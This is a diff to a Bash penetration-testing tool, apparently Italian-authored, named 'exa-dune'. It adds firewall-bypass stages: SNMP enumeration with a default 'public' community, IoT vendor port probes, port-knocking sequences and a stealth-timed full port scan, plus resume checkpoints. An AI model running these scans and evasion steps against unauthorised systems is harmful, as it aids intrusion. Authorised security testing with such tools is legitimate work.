@@ -1033,7 +1033,7 @@ _ensure_media_tools() {
 
 # ── Download wordlists aggiuntive da GitHub ───────────────────────────────────
 EXA_WL_DIR="/usr/share/exa-dune/wordlists"
-EXA_REPORTS_DIR="/home/kali/Desktop/EXA-DUNE-Reports"
+EXA_REPORTS_DIR="$(xdg-user-dir DESKTOP 2>/dev/null || echo "$HOME/Desktop")/EXA-DUNE-Reports"
 EXA_SCRIPTS_DIR="/usr/share/exa-dune/scripts"
 
 _init_reports_dir() {
@@ -6987,19 +6987,20 @@ _mac_to_link_local() {
 
 cmd_fw() {
     local target="" ports_str="22,23,80,443,445,5060,8080,8443,8554,21,25,53,554,2323"
-    local tech_str="all" sip_port=5060 upnp_port="" probe_port=14444
+    local tech_str="all" sip_port=5060 upnp_port="" probe_port=14444 snmp_community=""
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --ports)      _req_arg "$1" "${2:-}"; ports_str="$2";    shift 2 ;;
-            --tech)       _req_arg "$1" "${2:-}"; tech_str="$2";     shift 2 ;;
-            --sip-port)   _req_arg "$1" "${2:-}"; sip_port="$2";     shift 2 ;;
-            --upnp-port)  _req_arg "$1" "${2:-}"; upnp_port="$2";    shift 2 ;;
-            --probe-port) _req_arg "$1" "${2:-}"; probe_port="$2";   shift 2 ;;
-            --output)     _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";  shift 2 ;;
-            --dry-run)    DRY_RUN=1;         shift ;;
-            --help|-h)    usage_fw; exit 0 ;;
-            -*)           err "Opzione sconosciuta: $1"; usage_fw; exit 1 ;;
-            *)            target="$1"; shift ;;
+            --ports)           _req_arg "$1" "${2:-}"; ports_str="$2";       shift 2 ;;
+            --tech)            _req_arg "$1" "${2:-}"; tech_str="$2";        shift 2 ;;
+            --sip-port)        _req_arg "$1" "${2:-}"; sip_port="$2";        shift 2 ;;
+            --upnp-port)       _req_arg "$1" "${2:-}"; upnp_port="$2";       shift 2 ;;
+            --probe-port)      _req_arg "$1" "${2:-}"; probe_port="$2";      shift 2 ;;
+            --snmp-community)  _req_arg "$1" "${2:-}"; snmp_community="$2";  shift 2 ;;
+            --output)          _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";     shift 2 ;;
+            --dry-run)         DRY_RUN=1;              shift ;;
+            --help|-h)         usage_fw; exit 0 ;;
+            -*)                err "Opzione sconosciuta: $1"; usage_fw; exit 1 ;;
+            *)                 target="$1"; shift ;;
         esac
     done
     [[ -z "$target" ]] && { err "TARGET mancante"; usage_fw; exit 1; }
@@ -7014,11 +7015,13 @@ cmd_fw() {
     local do_ipv6=0 do_upnp=0 do_sip_alg=0
     local do_decoy=0 do_ttl=0 do_datalen=0 do_slowscan=0
     local do_icmp=0 do_ftp_alg=0 do_http_tunnel=0 do_proto_confuse=0
+    local do_knock=0 do_fullscan=0 do_iot_ports=0 do_snmp_recon=0
     if [[ "$tech_str" == "all" ]]; then
         do_ack=1; do_alt=1; do_srcport=1; do_frag=1; do_badsum=1
         do_ipv6=1; do_upnp=1; do_sip_alg=1
         do_decoy=1; do_ttl=1; do_datalen=1; do_slowscan=1
         do_icmp=1; do_ftp_alg=1; do_http_tunnel=1; do_proto_confuse=1
+        do_knock=1; do_fullscan=1; do_iot_ports=1; do_snmp_recon=1
     else
         IFS=',' read -ra techs <<< "$tech_str"
         for t in "${techs[@]}"; do
@@ -7039,6 +7042,10 @@ cmd_fw() {
                 ftp-alg)       do_ftp_alg=1 ;;
                 http-tunnel)   do_http_tunnel=1 ;;
                 proto-confuse) do_proto_confuse=1 ;;
+                knock)         do_knock=1 ;;
+                fullscan)      do_fullscan=1 ;;
+                iot-ports)     do_iot_ports=1 ;;
+                snmp-recon)    do_snmp_recon=1 ;;
                 *) warn "Tecnica sconosciuta: $t — ignorata" ;;
             esac
         done
@@ -7683,7 +7690,241 @@ cmd_fw() {
         fi
     fi
 
-    # ── 17. Matrix + Summary bypass ──────────────────────────
+    # ── 17. SNMP-based recon (quando community nota) ─────────
+    if [[ $do_snmp_recon -eq 1 ]]; then
+        section "SNMP Recon (interfacce / routing / connessioni)"
+        # Determina community: parametro esplicito > prescan_dir > public
+        local _snmp_comm="${snmp_community:-}"
+        local _prescan_dir; _prescan_dir=$(find "$OUTDIR/.." -maxdepth 2 -name "snmp_quick.txt" 2>/dev/null | head -1 || true)
+        if [[ -z "$_snmp_comm" && -n "$_prescan_dir" ]]; then
+            _snmp_comm=$(grep -oP '(?<=community=)\S+' "$_prescan_dir" 2>/dev/null | head -1 || true)
+        fi
+        [[ -z "$_snmp_comm" ]] && _snmp_comm="public"
+        log "SNMP community usata: $_snmp_comm"
+
+        if [[ $DRY_RUN -eq 0 ]]; then
+            if ! command -v snmpwalk &>/dev/null; then
+                warn "snmpwalk non trovato — SNMP recon saltato (apt install snmp)"
+            else
+                local _snmp_base_cmd="snmpwalk -v2c -c $_snmp_comm -t 3 -r 1 $target"
+                # Interfacce di rete — può rivelare altri IP/vlan
+                log "  Enumerazione interfacce (ifTable)..."
+                timeout 15 $SHELL -c "$_snmp_base_cmd ifDescr ifOperStatus ifPhysAddress \
+                    ipAdEntAddr ipAdEntNetMask 2>/dev/null" \
+                    > "$OUTDIR/snmp_ifaces.txt" 2>&1 || true
+                if [[ -s "$OUTDIR/snmp_ifaces.txt" ]]; then
+                    found MEDIUM "SNMP — Interfacce rilevate via community '$_snmp_comm'"
+                    # Estrai indirizzi IP aggiuntivi
+                    local _extra_ips
+                    _extra_ips=$(grep -oP '\d{1,3}(\.\d{1,3}){3}' "$OUTDIR/snmp_ifaces.txt" \
+                        2>/dev/null | grep -v "^$target$\|^127\.\|^0\." | sort -u || true)
+                    if [[ -n "$_extra_ips" ]]; then
+                        found HIGH "SNMP — Indirizzi IP aggiuntivi trovati: $(echo "$_extra_ips" | tr '\n' ' ')"
+                        echo "$_extra_ips" > "$OUTDIR/snmp_extra_ips.txt"
+                        echo "SNMP extra IPs: $_extra_ips" >> "$OUTDIR/fw_summary.txt"
+                    fi
+                fi
+                # Routing table — rivela rotte interne e gateway
+                log "  Routing table (ipRouteTable)..."
+                timeout 10 $SHELL -c "$_snmp_base_cmd ipRouteDest ipRouteNextHop ipRouteMask \
+                    2>/dev/null" > "$OUTDIR/snmp_routes.txt" 2>&1 || true
+                if [[ -s "$OUTDIR/snmp_routes.txt" ]]; then
+                    found MEDIUM "SNMP — Routing table accessibile — possibili reti interne"
+                    grep -oP '\d{1,3}(\.\d{1,3}){3}' "$OUTDIR/snmp_routes.txt" 2>/dev/null | \
+                        grep -v "^0\.\|^127\." | sort -u >> "$OUTDIR/snmp_extra_ips.txt" 2>/dev/null || true
+                fi
+                # Connessioni TCP attive — rivela porte in ascolto non trovate dal scan
+                log "  Connessioni TCP attive (tcpConnTable)..."
+                timeout 10 $SHELL -c "$_snmp_base_cmd tcpConnState tcpConnLocalAddress \
+                    tcpConnLocalPort tcpConnRemAddress tcpConnRemPort 2>/dev/null" \
+                    > "$OUTDIR/snmp_tcp_conn.txt" 2>&1 || true
+                if [[ -s "$OUTDIR/snmp_tcp_conn.txt" ]]; then
+                    # Estrai porte in stato listen
+                    local _listen_ports
+                    _listen_ports=$(grep -i "listen\|established" "$OUTDIR/snmp_tcp_conn.txt" \
+                        2>/dev/null | grep -oP 'LocalPort[^=]*=\s*\K[0-9]+' | sort -un | tr '\n' ' ' || true)
+                    if [[ -n "$_listen_ports" ]]; then
+                        found HIGH "SNMP — Porte in ascolto rilevate via tcpConnTable: $_listen_ports"
+                        echo "SNMP listen ports: $_listen_ports" >> "$OUTDIR/fw_summary.txt"
+                        # Aggiunge porte SNMP all'open_tcp per il bypass matrix
+                        for _sp in $_listen_ports; do
+                            _fw_found "$_sp" "SNMP tcpConnTable (porta in ascolto)"
+                        done
+                    fi
+                fi
+                # sysInfo — utile anche per vendor/modello
+                log "  System info (sysDescr/sysName/sysContact/sysLocation)..."
+                timeout 8 $SHELL -c "$_snmp_base_cmd sysDescr.0 sysName.0 sysContact.0 \
+                    sysLocation.0 sysUpTime.0 2>/dev/null" \
+                    > "$OUTDIR/snmp_sysinfo.txt" 2>&1 || true
+                [[ -s "$OUTDIR/snmp_sysinfo.txt" ]] && \
+                    found INFO "SNMP — Info sistema: $(head -2 "$OUTDIR/snmp_sysinfo.txt" | tr '\n' ' ')"
+            fi
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} snmpwalk -v2c -c ${_snmp_comm:-public} $target ifTable/ipRoute/tcpConn/sysInfo"
+        fi
+    fi
+
+    # ── 18. IoT vendor-specific port probe ───────────────────
+    if [[ $do_iot_ports -eq 1 ]]; then
+        section "IoT Vendor-Specific Port Probe"
+        # Porte note di management IoT non incluse nel default ports_str
+        # Formato: "porta:descrizione"
+        local -a _iot_ports=(
+            "37777:Dahua SDK/config"
+            "34567:Dahua HTTP alt"
+            "8000:Hikvision SDK"
+            "8200:Hikvision ISAPI alt"
+            "8899:Reolink RTSP alt"
+            "9000:Reolink HTTP/ONVIF"
+            "8291:MikroTik Winbox"
+            "7547:TR-069 CWMP (ISP management)"
+            "4567:Generic IoT config"
+            "2000:Cisco SCCP (VoIP)"
+            "5038:Asterisk AMI"
+            "8888:Generic IoT HTTP alt"
+            "9999:Generic IoT debug"
+            "4786:Cisco Smart Install"
+            "1723:PPTP VPN"
+            "6667:IRC (botnet C2 / legacy)"
+            "49152:UPnP dynamic"
+            "50000:SAP / generic high"
+            "55000:Axis VAPIX alt"
+            "10554:Reolink RTSP alt"
+            "65535:Max port (generic IoT debug)"
+        )
+        local _iot_found=0
+        if [[ $DRY_RUN -eq 0 ]]; then
+            log "Probe ${#_iot_ports[@]} porte IoT vendor-specifiche..."
+            local _iot_open_list=""
+            for _entry in "${_iot_ports[@]}"; do
+                local _p="${_entry%%:*}" _desc="${_entry#*:}"
+                if check_port "$target" "$_p" 2>/dev/null; then
+                    found HIGH "IoT — Porta $_p aperta ($_desc)"
+                    _fw_found "$_p" "IoT vendor probe ($_desc)"
+                    _iot_open_list="$_iot_open_list $_p"
+                    _iot_found=$(( _iot_found + 1 ))
+                fi
+            done
+            if [[ $_iot_found -gt 0 ]]; then
+                log "Porte IoT aperte: $_iot_open_list"
+                echo "IoT ports open: $_iot_open_list" >> "$OUTDIR/fw_summary.txt"
+                # Service detection rapida sulle porte trovate
+                local _iot_ports_csv; _iot_ports_csv="${_iot_open_list// /,}"
+                _iot_ports_csv="${_iot_ports_csv#,}"
+                run_cmd "nmap_iot_svcdet" \
+                    "nmap -sV --version-intensity 3 -p ${_iot_ports_csv} $NMAP_TIMING \
+                     -oN \"$OUTDIR\"/iot_svcdet.nmap $target 2>&1"
+            else
+                log "Nessuna porta IoT vendor-specifica risponde"
+            fi
+        else
+            for _entry in "${_iot_ports[@]}"; do
+                echo -e "${CYAN}[DRY-RUN]${NC} check_port $target ${_entry%%:*} (${_entry#*:})"
+            done
+        fi
+    fi
+
+    # ── 19. Port knocking ─────────────────────────────────────
+    if [[ $do_knock -eq 1 ]]; then
+        section "Port Knocking (sequenze comuni embedded/IoT)"
+        # Sequenze comuni su device IoT/embedded/router
+        # Formato: "p1,p2,p3:porta_da_verificare:descrizione"
+        local -a _knock_seqs=(
+            "1234,2345,3456:22:default seq 1-3"
+            "7000,8000,9000:22:high ports seq"
+            "1111,2222,3333:22:repeat seq"
+            "8080,8443,8554:80:web mgmt seq"
+            "5060,5061,5062:22:SIP port seq"
+            "4000,5000,6000:22:mid-range seq"
+            "22,80,443:8080:trusted port seq"
+            "1337,31337,1338:22:hacker classics"
+            "2000,3000,4000:443:audio/video seq"
+            "9876,5432,1234:22:reverse seq"
+        )
+        if [[ $DRY_RUN -eq 0 ]]; then
+            local _knock_found=0
+            for _kseq in "${_knock_seqs[@]}"; do
+                local _kports="${_kseq%%:*}"
+                local _rest="${_kseq#*:}"
+                local _kcheck="${_rest%%:*}"
+                local _kdesc="${_rest#*:}"
+                log "  Knock: [$(echo "$_kports" | tr ',' '→')] poi check :$_kcheck ($kdesc)..."
+                # Esegui la sequenza di knock (TCP SYN su ogni porta)
+                IFS=',' read -ra _kp_arr <<< "$_kports"
+                for _kp in "${_kp_arr[@]}"; do
+                    # nmap -sS singola porta, velocissimo (solo per inviare SYN)
+                    nmap -sS -p "$_kp" --host-timeout 1s -T4 \
+                        --max-retries 0 "$target" &>/dev/null || true
+                    sleep 0.3
+                done
+                # Attendi che il device processi la sequenza
+                sleep 1
+                # Controlla se la porta target si è aperta
+                if check_port "$target" "$_kcheck"; then
+                    found CRITICAL "PORT KNOCK — Sequenza [$_kports] ha aperto la porta $_kcheck ($_kdesc)"
+                    _fw_found "$_kcheck" "port knocking [$_kports]"
+                    echo "Knock sequence: $_kports → :$_kcheck" >> "$OUTDIR/fw_summary.txt"
+                    _knock_found=$(( _knock_found + 1 ))
+                    # Tenta anche porte aggiuntive comuni dopo il knock riuscito
+                    for _bonus in 22 23 80 443 8080 8443; do
+                        [[ "$_bonus" == "$_kcheck" ]] && continue
+                        if check_port "$target" "$_bonus"; then
+                            found HIGH "PORT KNOCK — Anche porta $_bonus aperta dopo knock [$_kports]"
+                            _fw_found "$_bonus" "port knocking bonus [$_kports]"
+                        fi
+                    done
+                fi
+            done
+            if [[ $_knock_found -eq 0 ]]; then
+                log "Nessuna sequenza di port knocking ha prodotto risultati"
+            fi
+        else
+            for _kseq in "${_knock_seqs[@]}"; do
+                local _kp="${_kseq%%:*}" _kr="${_kseq#*:}"
+                echo -e "${CYAN}[DRY-RUN]${NC} knock [$(echo "$_kp" | tr ',' '→')] → check :${_kr%%:*}"
+            done
+        fi
+    fi
+
+    # ── 20. Full port scan (tutte le 65535 porte) ─────────────
+    if [[ $do_fullscan -eq 1 ]]; then
+        section "Full Port Scan (tutti i 65535 port TCP — T2 slow)"
+        warn "Scan completo di 65535 porte — può richiedere diversi minuti"
+        # Usa T2 + --min-parallelism 10 per equilibrio velocità/stealth
+        local _fp_timing="-T2 --min-parallelism 10 --max-retries 1"
+        [[ $STEALTH -eq 1 ]] && _fp_timing="-T1 --scan-delay 500ms --max-retries 1"
+        run_cmd "nmap_fullscan" \
+            "nmap -sS -p- $_fp_timing \
+             -oG \"$OUTDIR\"/fw_fullscan.gnmap \
+             -oN \"$OUTDIR\"/fw_fullscan.nmap \
+             $target 2>&1"
+        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/fw_fullscan.gnmap" ]]; then
+            local full_open; full_open=$(_fw_open "$OUTDIR/fw_fullscan.gnmap")
+            local n_full; n_full=$(echo "$full_open" | grep -c '[0-9]' 2>/dev/null || echo 0)
+            if [[ $n_full -gt 0 ]]; then
+                found HIGH "Full scan — $n_full porte aperte: $(echo "$full_open" | tr '\n' ' ')"
+                echo "Full scan open: $full_open" >> "$OUTDIR/fw_summary.txt"
+                # Confronta con baseline: porta non presente nel default ports_str → nuova scoperta
+                while IFS= read -r _fp; do
+                    [[ -z "$_fp" ]] && continue
+                    if ! echo ",$ports_str," | grep -q ",$_fp,"; then
+                        found CRITICAL "Full scan — Porta non-standard aperta: $_fp (non nel set base)"
+                        _fw_found "$_fp" "full port scan (porta non-standard)"
+                    fi
+                done <<< "$full_open" || true
+                # Service detection sulle nuove porte trovate
+                local _full_csv; _full_csv=$(echo "$full_open" | tr '\n' ',' | sed 's/,$//')
+                [[ -n "$_full_csv" ]] && run_cmd "nmap_full_svcdet" \
+                    "nmap -sV --version-intensity 5 -p ${_full_csv} $NMAP_TIMING \
+                     -oN \"$OUTDIR\"/fw_fullscan_svc.nmap $target 2>&1"
+            else
+                log "Full scan: nessuna porta TCP aperta su tutto il range 1-65535"
+            fi
+        fi
+    fi
+
+    # ── 22. Matrix + Summary bypass ──────────────────────────
     section "Bypass Matrix & Summary"
     if [[ $DRY_RUN -eq 0 ]]; then
         # Costruisci matrice porta × tecnica
@@ -7778,6 +8019,26 @@ cmd_fw() {
                     *"rate evasion"*)
                         echo -e "  ${CYAN}→${NC} Porta $p_trim visibile solo con scan lento: IDS con rate-limiting attivo"
                         echo -e "  ${CYAN}→${NC} Usa -T1 o --scan-delay per tutti i scan futuri su questo target"
+                        suggested=$((suggested+1))
+                        ;;
+                    *"port knocking"*)
+                        echo -e "  ${CYAN}→${NC} Port knocking attivo su porta $p_trim: la sequenza deve essere ripetuta ad ogni accesso"
+                        echo -e "  ${CYAN}→${NC} Automatizza con: knockd client o script nmap -sS -p <seq> $target"
+                        suggested=$((suggested+1))
+                        ;;
+                    *"IoT vendor probe"*)
+                        echo -e "  ${CYAN}→${NC} Porta vendor-specifica $p_trim: controlla il protocollo nativo (SDK, API proprietaria)"
+                        echo -e "  ${CYAN}→${NC} Prova: nmap -sV -p $p_trim --script banner $target"
+                        suggested=$((suggested+1))
+                        ;;
+                    *"SNMP tcpConnTable"*)
+                        echo -e "  ${CYAN}→${NC} Porta $p_trim in ascolto rilevata via SNMP: prova connessione diretta"
+                        echo -e "  ${CYAN}→${NC} Esegui: exa-dune web $target (se HTTP) o nmap -sV -p $p_trim $target"
+                        suggested=$((suggested+1))
+                        ;;
+                    *"full port scan"*)
+                        echo -e "  ${CYAN}→${NC} Porta non-standard $p_trim: il device usa porte fuori dal range comune"
+                        echo -e "  ${CYAN}→${NC} Prova: nmap -sV -p $p_trim -A $target per fingerprint completo"
                         suggested=$((suggested+1))
                         ;;
                 esac
@@ -7940,7 +8201,7 @@ cmd_pipeline() {
         local mod_flags="--output $OUTDIR_BASE"
         [[ $STEALTH -eq 1 ]] && mod_flags="$mod_flags --stealth"
         [[ $DRY_RUN -eq 1 ]] && mod_flags="$mod_flags --dry-run"
-        [[ "${TIMEOUT:-0}" -gt 0 ]] && mod_flags="$mod_flags --timeout $TIMEOUT"
+        # --timeout non passato ai sotto-moduli: non tutti lo accettano
         [[ -n "$CUSTOM_USERS" ]] && mod_flags="$mod_flags --userlist $CUSTOM_USERS"
         [[ -n "$CUSTOM_PASS"  ]] && mod_flags="$mod_flags --passlist $CUSTOM_PASS"
         _timeline_event "  MOD START — $module $args"
@@ -8076,18 +8337,20 @@ usage_auto() {
     echo "  --passlist FILE"
     echo "  --output DIR"
     echo "  --dry-run"
+    echo "  --resume DIR       Riprende da un output dir esistente (salta le operazioni già completate)"
 }
 
 cmd_auto() {
-    local target=""
+    local target="" _RESUME=0
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --stealth)   STEALTH=1;                                    shift ;;
-            --timeout)   _req_arg "$1" "${2:-}"; TIMEOUT="$2";        shift 2 ;;
-            --userlist)  _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2";   shift 2 ;;
-            --passlist)  _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2";    shift 2 ;;
-            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";    shift 2 ;;
-            --dry-run)   DRY_RUN=1;                                    shift ;;
+            --stealth)   STEALTH=1;                                              shift ;;
+            --timeout)   _req_arg "$1" "${2:-}"; TIMEOUT="$2";                  shift 2 ;;
+            --userlist)  _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2";             shift 2 ;;
+            --passlist)  _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2";              shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";              shift 2 ;;
+            --resume)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; _RESUME=1;   shift 2 ;;
+            --dry-run)   DRY_RUN=1;                                              shift ;;
             --help|-h)   usage_auto; exit 0 ;;
             -*)          err "Opzione sconosciuta: $1"; usage_auto; exit 1 ;;
             *)           target="$1"; shift ;;
@@ -8105,29 +8368,64 @@ cmd_auto() {
     OUTDIR="$OUTDIR_BASE"
     [[ $DRY_RUN -eq 0 ]] && _log_file="$OUTDIR_BASE/master.log" || _log_file=""
 
+    # ── Checkpoint + progress ─────────────────────────────────────
+    local _ckpt_file="" _mod_done=0 _phase_num=0
+    if [[ $DRY_RUN -eq 0 ]]; then
+        _ckpt_file="$OUTDIR_BASE/.exa_checkpoint"
+        touch "$_ckpt_file" 2>/dev/null || true
+        if [[ $_RESUME -eq 1 ]]; then
+            [[ -f "$_ckpt_file" ]] || { err "Checkpoint non trovato in $OUTDIR_BASE"; exit 1; }
+            ok "Resume da checkpoint: $(grep -c '' "$_ckpt_file" 2>/dev/null || echo 0) operazioni già completate"
+        fi
+    fi
+    _ckpt_done() { [[ -n "$_ckpt_file" ]] && echo "$1" >> "$_ckpt_file" 2>/dev/null || true; }
+    _ckpt_skip() { [[ -n "$_ckpt_file" ]] && grep -qxF "$1" "$_ckpt_file" 2>/dev/null; }
+
     # Flag comuni per tutti i sotto-moduli
+    # NOTA: --timeout NON viene passato ai sotto-moduli perché la maggior parte non lo accetta;
+    # il timeout è già gestito dal wrapper `timeout $s exa-dune ...` dentro _run_mod.
     local common_flags=""
     [[ $DRY_RUN -eq 1 ]]           && common_flags="--dry-run"
     [[ $STEALTH -eq 1 ]]           && common_flags="$common_flags --stealth"
-    [[ "${TIMEOUT:-0}" -gt 0 ]]    && common_flags="$common_flags --timeout $TIMEOUT"
     [[ -n "${CUSTOM_USERS:-}" ]]   && common_flags="$common_flags --userlist $CUSTOM_USERS"
     [[ -n "${CUSTOM_PASS:-}" ]]    && common_flags="$common_flags --passlist $CUSTOM_PASS"
 
     # Helper: esegue un modulo con output visibile in tempo reale
     _run_mod() {
         local label="$1"; shift
-        log "  ▶ $label"
+        # Checkpoint: salta se già completato in una sessione precedente
+        if _ckpt_skip "mod:$label"; then
+            echo -e "  ${CYAN}↷${NC} [${_phase_num}/4] $label ${CYAN}(skip)${NC}"
+            return 0
+        fi
+        (( _mod_done++ )) || true
+        local _ts0; _ts0=$(date +%s)
+        local _mod_t=$(( TIMEOUT > 0 ? TIMEOUT : 60 ))
+        local _mod_timeout_s=$(( _mod_t * 60 ))
+        echo -e "\n  ${BOLD}${CYAN}[Fase ${_phase_num}/4 | #${_mod_done}]${NC} ${BOLD}▶ ${label}${NC} ${CYAN}(max ${_mod_t}m)${NC}"
         if [[ $DRY_RUN -eq 0 ]]; then
             # shellcheck disable=SC2086
-            exa-dune "$@" $common_flags --output "$OUTDIR_BASE"
+            if timeout "$_mod_timeout_s" exa-dune "$@" $common_flags --output "$OUTDIR_BASE"; then
+                local _el=$(( $(date +%s) - _ts0 ))
+                ok "  ✔ $label completato (${_el}s)"
+            else
+                local _ec=$? _el=$(( $(date +%s) - _ts0 ))
+                if [[ $_ec -eq 124 ]]; then
+                    warn "  ⚠ $label: timeout dopo ${_mod_t}m — risultati parziali salvati"
+                else
+                    warn "  ⚠ $label: terminato con errore (exit $_ec, ${_el}s)"
+                fi
+            fi
+            _ckpt_done "mod:$label"
         else
-            echo -e "${CYAN}[DRY-RUN]${NC} exa-dune $* $common_flags --output $OUTDIR_BASE"
+            echo -e "${CYAN}[DRY-RUN]${NC} timeout ${_mod_timeout_s}s exa-dune $* $common_flags --output $OUTDIR_BASE"
         fi
     }
 
     # ─────────────────────────────────────────────────────────
     # FASE 1 — SCAN
     # ─────────────────────────────────────────────────────────
+    _phase_num=1
     echo ""
     echo -e "${BOLD}${CYAN}══════════════════════════════════════════${NC}"
     echo -e "${BOLD}${CYAN}  FASE 1 — SCAN                           ${NC}"
@@ -8309,15 +8607,20 @@ cmd_auto() {
     fi
 
     # ── SUB-CASO 1: scan completo ────────────────────────────
-    log "▶ Scan completo (nmap fast + full + UDP + ARP + searchsploit)..."
-    if [[ $DRY_RUN -eq 0 ]]; then
-        # Se ICMP bloccato, inietta -Pn tramite NMAP_TIMING override
-        [[ -n "$nmap_ping_flag" ]] && export NMAP_OPTS_EXTRA="-Pn" || true
-        # shellcheck disable=SC2086
-        exa-dune scan "$target" $common_flags --output "$OUTDIR_BASE"
-        unset NMAP_OPTS_EXTRA
+    if _ckpt_skip "op:scan"; then
+        log "↷ Scan completo (skip — checkpoint)"
     else
-        echo -e "${CYAN}[DRY-RUN]${NC} scan $target${nmap_ping_flag:+ (con -Pn)}"
+        log "▶ Scan completo (nmap fast + full + UDP + ARP + searchsploit)..."
+        if [[ $DRY_RUN -eq 0 ]]; then
+            # Se ICMP bloccato, inietta -Pn tramite NMAP_TIMING override
+            [[ -n "$nmap_ping_flag" ]] && export NMAP_OPTS_EXTRA="-Pn" || true
+            # shellcheck disable=SC2086
+            exa-dune scan "$target" $common_flags --output "$OUTDIR_BASE"
+            unset NMAP_OPTS_EXTRA
+            _ckpt_done "op:scan"
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} scan $target${nmap_ping_flag:+ (con -Pn)}"
+        fi
     fi
 
     # Estrai porte aperte TCP e UDP dai file gnmap prodotti dal scan
@@ -8338,6 +8641,7 @@ cmd_auto() {
 
     # Restituisce 0 se la porta è aperta (TCP o UDP)
     _port_open() { echo " $open_tcp $open_udp " | grep -qw "$1"; }
+    _ls_count()  { local _d="$1" _g="${2:-*}"; ls "$_d"/$_g 2>/dev/null | wc -l || echo 0; }
 
     # 7. MAC → vendor lookup (da ARP scan già eseguito in cmd_scan)
     log "▶ [post-scan] MAC/vendor lookup..."
@@ -8401,9 +8705,18 @@ cmd_auto() {
         # ── SUB-CASO 2: nessun risultato → verifica firewall ─
         warn "Scan: nessun punto debole rilevato — verifico presenza di un firewall..."
         log "▶ Firewall detection + bypass (tutte le tecniche)..."
+
+        # Passa la community SNMP trovata nel pre-scan a cmd_fw
+        local _fw_snmp_flag=""
+        if [[ $DRY_RUN -eq 0 && -s "$prescan_dir/snmp_quick.txt" ]]; then
+            local _known_comm
+            _known_comm=$(grep -oP '(?<=community=)\S+' "$prescan_dir/snmp_quick.txt" 2>/dev/null | head -1 || true)
+            [[ -n "$_known_comm" ]] && _fw_snmp_flag="--snmp-community $_known_comm"
+        fi
+
         if [[ $DRY_RUN -eq 0 ]]; then
             # shellcheck disable=SC2086
-            exa-dune fw "$target" $common_flags --output "$OUTDIR_BASE"
+            exa-dune fw "$target" $common_flags $_fw_snmp_flag --output "$OUTDIR_BASE"
         else
             echo -e "${CYAN}[DRY-RUN]${NC} fw $target --tech all"
         fi
@@ -8419,14 +8732,51 @@ cmd_auto() {
             open_tcp="$open_tcp $bypass_ports"
             ok "Firewall bypassato — porte raggiunte: $bypass_ports"
         fi
+        # Aggiungi anche eventuali IP extra trovati da SNMP recon
+        local _snmp_extra_ips=""
+        if [[ $DRY_RUN -eq 0 && -s "$OUTDIR_BASE/fw/snmp_extra_ips.txt" ]]; then
+            _snmp_extra_ips=$(cat "$OUTDIR_BASE/fw/snmp_extra_ips.txt" 2>/dev/null || true)
+            [[ -n "$_snmp_extra_ips" ]] && \
+                warn "SNMP ha rilevato IP aggiuntivi: $_snmp_extra_ips — considera scan su questi target"
+        fi
 
         if [[ $bypass_ok -eq 1 ]]; then
-            ok "Bypass riuscito → procedo con l'enumerazione"
+            ok "Bypass riuscito → service detection sulle porte bypassate..."
+            # ── Service detection mirata sulle porte bypassate ───
+            if [[ $DRY_RUN -eq 0 && -n "$bypass_ports" ]]; then
+                local _bp_csv; _bp_csv="${bypass_ports// /,}"
+                _bp_csv="${_bp_csv//,,/,}"; _bp_csv="${_bp_csv#,}"; _bp_csv="${_bp_csv%,}"
+                if [[ -n "$_bp_csv" ]]; then
+                    log "▶ nmap -sV sulle porte bypassate: $_bp_csv"
+                    local _bp_svc_dir="$OUTDIR_BASE/fw/bypass_svcdet"
+                    mkdir -p "$_bp_svc_dir"
+                    nmap -sV --version-intensity 5 -p "$_bp_csv" "$NMAP_TIMING" \
+                        -oN "$_bp_svc_dir/svcdet.nmap" \
+                        -oG "$_bp_svc_dir/svcdet.gnmap" \
+                        "$target" 2>/dev/null || true
+                    if [[ -f "$_bp_svc_dir/svcdet.nmap" ]]; then
+                        # Estrai i servizi trovati e loggali
+                        local _svc_hits
+                        _svc_hits=$(grep -E "^[0-9]+/tcp.*open" "$_bp_svc_dir/svcdet.nmap" 2>/dev/null || true)
+                        if [[ -n "$_svc_hits" ]]; then
+                            ok "Servizi trovati sulle porte bypassate:"
+                            echo "$_svc_hits" | while IFS= read -r _line; do
+                                echo -e "    ${GREEN}▸${NC} $_line"
+                            done
+                            # Aggiunge ai findings globali
+                            {
+                                echo "=== SERVICE DETECTION POST-BYPASS ==="
+                                echo "$_svc_hits"
+                            } >> "$OUTDIR_BASE/findings.txt" 2>/dev/null || true
+                        fi
+                    fi
+                fi
+            fi
             scan_has_info=1
         else
             # ── SUB-CASO 3: bypass fallito → salta a FASE 4 ──
             warn "Bypass firewall fallito — nessun punto di accesso trovato"
-            log "Approcci tentati: scan completo (nmap SYN/UDP/full), ARP, searchsploit, fw bypass (ACK/FIN/Xmas/NULL/frag/srcport/decoy/TTL/slowscan/UPnP/SIP-ALG/IPv6)"
+            log "Approcci tentati: scan completo (nmap SYN/UDP/full), ARP, searchsploit, fw bypass (ACK/FIN/Xmas/NULL/frag/srcport/decoy/TTL/slowscan/UPnP/SIP-ALG/IPv6/port-knock/IoT-ports/SNMP/full-65535)"
 
             # Scrivi un sommario degli approcci per il report
             {
@@ -8454,11 +8804,23 @@ cmd_auto() {
                 echo "  FIREWALL BYPASS:"
                 echo "   16.  ACK scan (stateful vs stateless detection)"
                 echo "   17.  FIN / Xmas / NULL / Maimon / Window scan"
-                echo "   18.  Source port spoofing (53, 80, 443)"
+                echo "   18.  Source port spoofing (53, 20, 21, 80, 443, 123, 554, 3389, 5060...)"
                 echo "   19.  Frammentazione IP (-f, --mtu 8/16/24)"
                 echo "   20.  Decoy scan, TTL manipulation, data length padding"
-                echo "   21.  Slow scan (T0/T1), UPnP/SSDP probe"
-                echo "   22.  SIP-ALG probe, IPv6 scan"
+                echo "   21.  Slow scan (T1, --scan-delay 2s), bad checksum"
+                echo "   22.  UPnP AddPortMapping / WANPPPConnection punch-through"
